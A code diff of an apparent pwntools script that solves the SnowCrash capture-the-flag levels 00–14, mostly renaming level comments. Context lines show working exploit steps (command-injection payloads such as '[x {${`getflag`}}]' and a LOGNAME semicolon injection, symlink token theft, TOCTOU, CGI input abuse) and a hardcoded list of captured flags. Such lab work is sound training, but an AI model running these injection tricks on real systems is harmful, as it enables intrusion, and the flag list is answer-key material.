@@ -4,8 +4,8 @@ import sys
 from pwn import *
 
 context.log_level = "CRITICAL"
-flag_reg = re.compile("\w{25,39}")
 flags = []
+flag_reg = re.compile("\w{25,39}")
 ref_flags = [
     "x24ti5gi3x0ol2eh4esiuxias",
     "f2av5il02puano7naaf6adaaf",
@@ -55,7 +55,7 @@ def get_flag_as_user(shell, usr, passwd):
     add_flag(ret, int(usr[-2:]))
 
 
-# level00
+# level00@SnowCrash
 # find any interesting files and get 'em
 def level00():
     sh = ssh("level00", rhost, password="level00", port=rport)
@@ -69,7 +69,7 @@ def level00():
     sh.close()
 
 
-# level01
+# level01@SnowCrash
 # descrypt, traditional crypt(3)
 def level01():
     sh = ssh("level01", rhost, password=flags[0], port=rport)
@@ -84,7 +84,7 @@ def level01():
     sh.close()
 
 
-# level02
+# level02@SnowCrash
 # pcap parsing, tshark to the rescue
 def level02():
     sh = ssh("level02", rhost, password=flags[1], port=rport)
@@ -110,7 +110,7 @@ def level02():
     sh.close()
 
 
-# level03
+# level03@SnowCrash
 # symlinks and PATH shenanigans
 def level03():
     sh = ssh("level03", rhost, password=flags[2], port=rport)
@@ -120,7 +120,7 @@ def level03():
     sh.close()
 
 
-# level04
+# level04@SnowCrash
 # http post requests
 def level04():
     req = process(
@@ -139,7 +139,7 @@ def level04():
     req.close()
 
 
-# level05
+# level05@SnowCrash
 # cronjobs/init.rc
 def level05():
     sh = ssh("level05", rhost, password=flags[4], port=rport)
@@ -154,7 +154,7 @@ def level05():
     sh.close()
 
 
-# level06
+# level06@SnowCrash
 def level06():
     sh = ssh("level06", rhost, password=flags[5], port=rport)
     res = sh["echo '[x {${`getflag`}}]' >/tmp/arg; ./level06 /tmp/arg unused_argument"]
@@ -163,7 +163,7 @@ def level06():
     sh.close()
 
 
-# level07
+# level07@SnowCrash
 def level07():
     sh = ssh("level07", rhost, password=flags[6], port=rport)
     res = sh["env LOGNAME=\;getflag ./level07"]
@@ -172,7 +172,7 @@ def level07():
     sh.close()
 
 
-# level08
+# level08@SnowCrash
 def level08():
     sh = ssh("level08", rhost, password=flags[7], port=rport)
     passwd = sh["ln -fs $HOME/token /tmp/test; ./level08 /tmp/test"]
@@ -183,7 +183,7 @@ def level08():
     sh.close()
 
 
-# level09
+# level09@SnowCrash
 def level09():
     sh = ssh("level09", rhost, password=flags[8], port=rport)
     token = sh.download_data("token")
@@ -197,7 +197,7 @@ def level09():
     sh.close()
 
 
-# level10
+# level10@SnowCrash
 # TOCTOU
 def level10():
     sh = ssh("level10", rhost, password=flags[9], port=rport)
@@ -231,7 +231,7 @@ def level10():
     sh.close()
 
 
-# level11
+# level11@SnowCrash
 def level11():
     sh = ssh("level11", rhost, password=flags[10], port=rport)
     p = sh.process(["nc", "localhost", "5151"])
@@ -243,7 +243,7 @@ def level11():
     sh.close()
 
 
-# level12
+# level12@SnowCrash
 # perl CGI unsanitized inputs
 def level12():
     sh = ssh("level12", rhost, password=flags[11], port=rport)
@@ -259,7 +259,7 @@ def level12():
     sh.close()
 
 
-# level13
+# level13@SnowCrash
 # patching bytes my scungle
 def level13():
     sh = ssh("level13", rhost, password=flags[12], port=rport)
@@ -303,7 +303,7 @@ def ft_des(arg):
     return str(ret)
 
 
-# level14
+# level14@SnowCrash
 # cracking open the getflag binary
 def level14():
     sh = ssh("level14", rhost, password=flags[13], port=rport)
